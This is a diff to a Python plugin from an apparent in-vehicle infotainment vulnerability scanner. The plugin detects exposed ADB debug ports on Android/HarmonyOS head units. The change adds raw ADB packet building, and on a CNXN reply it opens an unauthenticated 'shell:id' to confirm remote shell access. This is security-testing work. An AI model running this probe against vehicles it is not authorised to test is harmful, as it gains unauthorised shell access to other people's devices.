@@ -10,6 +10,7 @@ Prerequisites: 目标 IVI 运行 Android/HarmonyOS 系统，且 ADB over TCP 已
 Usage: python3 09_ADB_Debug_Port.py <target_ip>
 """
 import socket
+import struct
 import sys
 from iv_plugin_base import IVIVulnerabilityPlugin
 
@@ -47,36 +48,114 @@ class ADBDebugPortPlugin(IVIVulnerabilityPlugin):
     扫描目标所有已知 ADB TCP 端口，尝试 ADB CNXN 握手，
     确认是否存在未授权远程 Shell 访问。
     """
-
+    meta_poc_name = "ADB Debug Port Detection"
+    meta_cve_id = "CVE-2018-6242"
+    meta_severity = "Critical"
+    meta_protocol = "tcp"
+    meta_target_os = ["android", "harmonyos"]
+    meta_required_params = ["target_ip"]
+    is_disruptive = False
+    meta_destructive_level = "Safe"
     def check_prerequisites(self):
         if not self.target_ip:
             raise RuntimeError("需要指定目标 IP 地址。")
+        self.expected_usb_serial = self.params.get("expected_usb_serial")
         return True
+
+    def _adb_checksum(self, payload):
+        return sum(payload) & 0xFFFFFFFF
+
+    def _adb_packet(self, command, arg0=0, arg1=0, payload=b""):
+        if isinstance(command, str):
+            command = command.encode("ascii")
+        cmd_int = struct.unpack("<I", command)[0]
+        payload = payload or b""
+        header = struct.pack(
+            "<6I",
+            cmd_int,
+            arg0,
+            arg1,
+            len(payload),
+            self._adb_checksum(payload),
+            cmd_int ^ 0xFFFFFFFF,
+        )
+        return header + payload
+
+    def _recv_exact(self, sock, size):
+        chunks = []
+        remaining = size
+        while remaining > 0:
+            chunk = sock.recv(remaining)
+            if not chunk:
+                break
+            chunks.append(chunk)
+            remaining -= len(chunk)
+        return b"".join(chunks)
+
+    def _recv_adb_packet(self, sock):
+        try:
+            header = self._recv_exact(sock, 24)
+            if len(header) < 24:
+                return None, b""
+            cmd_int, arg0, arg1, length, checksum, magic = struct.unpack("<6I", header)
+            command = struct.pack("<I", cmd_int)
+            payload = self._recv_exact(sock, length) if length else b""
+            return {
+                "command": command,
+                "arg0": arg0,
+                "arg1": arg1,
+                "length": length,
+                "checksum": checksum,
+                "magic": magic,
+            }, payload
+        except Exception:
+            return None, b""
+
+    def _try_shell_open(self, sock, remote_id):
+        local_id = 1
+        sock.sendall(self._adb_packet(b"OPEN", local_id, remote_id, b"shell:id\x00"))
+        packet, payload = self._recv_adb_packet(sock)
+        if not packet:
+            return False, b""
+        return packet["command"] in {b"OKAY", b"WRTE"}, payload
 
     def _check_adb_port(self, port, port_desc, timeout=4):
         """
-        尝试连接指定端口并发送 ADB CNXN 握手包。
-        返回 (open: bool, adb_response: bool, banner: bytes)
+        返回 dict:
+        {
+          open: bool,
+          command: bytes,
+          unauthorized_shell: bool,
+          detail: bytes
+        }
         """
+        result = {"open": False, "command": b"", "unauthorized_shell": False, "detail": b""}
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(timeout)
-            ret = s.connect_ex((self.target_ip, port))
-            if ret != 0:
+            if s.connect_ex((self.target_ip, port)) != 0:
                 s.close()
-                return False, False, b""
-            # 端口开放，尝试 ADB 握手
-            s.send(ADB_CNXN_PACKET)
-            s.settimeout(2)
-            try:
-                resp = s.recv(1024)
-            except socket.timeout:
-                resp = b""
+                return result
+
+            result["open"] = True
+            s.sendall(ADB_CNXN_PACKET)
+            packet, payload = self._recv_adb_packet(s)
+            if not packet:
+                result["detail"] = b""
+                s.close()
+                return result
+
+            result["command"] = packet["command"]
+            result["detail"] = payload[:128]
+            if packet["command"] == b"CNXN":
+                shell_ok, shell_payload = self._try_shell_open(s, packet["arg0"])
+                result["unauthorized_shell"] = shell_ok
+                if shell_payload:
+                    result["detail"] = shell_payload[:128]
             s.close()
-            adb_ok = b"CNXN" in resp
-            return True, adb_ok, resp
+            return result
         except Exception:
-            return False, False, b""
+            return result
 
     def exploit(self):
         host = self.target_ip
@@ -98,14 +177,16 @@ class ADBDebugPortPlugin(IVIVulnerabilityPlugin):
                             if ":" not in dev_id and "emulator" not in dev_id:
                                 wired_devices.append((dev_id, status))
                 
-                if wired_devices:
-                    self.logger.warning(f"  [!!!] 发现真实物理直连的 USB ADB 设备: {wired_devices}")
-                    self.results["vulnerable"] = True
-                    details = "\n".join(f"  直连设备标示: {d[0]}, 授权状态: {d[1]}" for d in wired_devices)
-                    self.results["evidence"] = f"【危】检测到车机向外部暴露了实体的有线 USB ADB 调试口:\n{details}"
-                    print(f"[!] 【漏洞存在】物理接口暴露！车机引出了未关闭的有线 ADB 调试通道: {[d[0] for d in wired_devices]}")
-                    # 若发现高危的物理底座泄露，直接报漏洞，可跳过后续网络扫描
-                    return self.results
+                if wired_devices and self.expected_usb_serial:
+                    matched_devices = [d for d in wired_devices if d[0] == self.expected_usb_serial]
+                    if matched_devices:
+                        self.logger.warning(f"  [!!!] 发现目标指定的物理 USB ADB 设备: {matched_devices}")
+                        self.results["vulnerable"] = True
+                        details = "\n".join(f"  直连设备标示: {d[0]}, 授权状态: {d[1]}" for d in matched_devices)
+                        self.results["evidence"] = f"检测到目标指定的有线 USB ADB 调试口:\n{details}"
+                        return self.results
+                elif wired_devices:
+                    self.logger.info("  [*] 本机存在其他 USB ADB 设备，但未提供 expected_usb_serial，避免误报，不据此下结论。")
                 else:
                     self.logger.info("  [-] 当前系统未检出直连的有线 ADB 设备。下放至网络端口扫描...")
         except FileNotFoundError:
@@ -118,29 +199,35 @@ class ADBDebugPortPlugin(IVIVulnerabilityPlugin):
             f"开始网络扫描 {host} 上所有已知 ADB 端口（共 {len(ADB_PORTS)} 个）..."
         )
 
-        open_ports = []       # 仅端口开放
-        vulnerable_ports = [] # 端口开放且 ADB 握手成功
+        open_ports = []
+        auth_required_ports = []
+        vulnerable_ports = []
 
         for port, desc in ADB_PORTS:
             self.logger.info(f"  探测 {host}:{port} ({desc})...")
-            is_open, is_adb, banner = self._check_adb_port(port, desc)
+            probe = self._check_adb_port(port, desc)
 
-            if not is_open:
+            if not probe["open"]:
                 self.logger.info(f"    [-] 端口关闭")
                 continue
 
             self.logger.info(f"    [+] 端口开放！")
             open_ports.append((port, desc))
 
-            if is_adb:
+            if probe["command"] == b"CNXN" and probe["unauthorized_shell"]:
                 self.logger.warning(
-                    f"    [!!!] ADB 握手成功 (CNXN 响应) - 端口 {port} ({desc})"
+                    f"    [!!!] ADB 握手成功且 shell OPEN 被接受 - 端口 {port} ({desc})"
                 )
-                vulnerable_ports.append((port, desc, banner[:40]))
+                vulnerable_ports.append((port, desc, probe["detail"][:40]))
+            elif probe["command"] == b"AUTH":
+                self.logger.info(f"    [*] 目标要求 ADB 认证，未确认未授权访问。")
+                auth_required_ports.append((port, desc))
+            elif probe["command"] == b"CNXN":
+                self.logger.info(f"    [*] 收到 CNXN 但未能确认 shell OPEN，结果保守处理。")
             else:
-                banner_preview = repr(banner[:32]) if banner else "(无响应)"
+                banner_preview = repr(probe["detail"][:32]) if probe["detail"] else "(无响应)"
                 self.logger.info(
-                    f"    [*] ADB 握手未成功（可能非 ADB 服务或需授权）: {banner_preview}"
+                    f"    [*] 未确认未授权 ADB shell（首包={probe['command']!r}）: {banner_preview}"
                 )
 
         # 判断结果
@@ -158,13 +245,16 @@ class ADBDebugPortPlugin(IVIVulnerabilityPlugin):
                 f"[!] 【漏洞存在】CVE-2018-6242: 未授权 ADB 访问 - "
                 f"漏洞端口: {[p for p,_,_ in vulnerable_ports]}"
             )
-        elif open_ports:
-            # 端口开放但握手未成功（可能是其他服务或 ADB 需要认证）
+        elif auth_required_ports or open_ports:
             self.results["vulnerable"] = False
-            self.results["evidence"] = (
-                f"发现 {len(open_ports)} 个开放端口但 ADB 握手均失败，可能已启用授权：\n"
-                + "\n".join(f"  端口 {p} ({d})" for p, d in open_ports)
-            )
+            evidence_lines = []
+            if auth_required_ports:
+                evidence_lines.append("以下端口返回 AUTH，说明启用了 ADB 认证：")
+                evidence_lines.extend(f"  端口 {p} ({d})" for p, d in auth_required_ports)
+            if open_ports:
+                evidence_lines.append("其余开放端口未确认可直接获得 shell：")
+                evidence_lines.extend(f"  端口 {p} ({d})" for p, d in open_ports if (p, d) not in auth_required_ports)
+            self.results["evidence"] = "\n".join(evidence_lines)
         else:
             self.results["vulnerable"] = False
             self.results["evidence"] = (
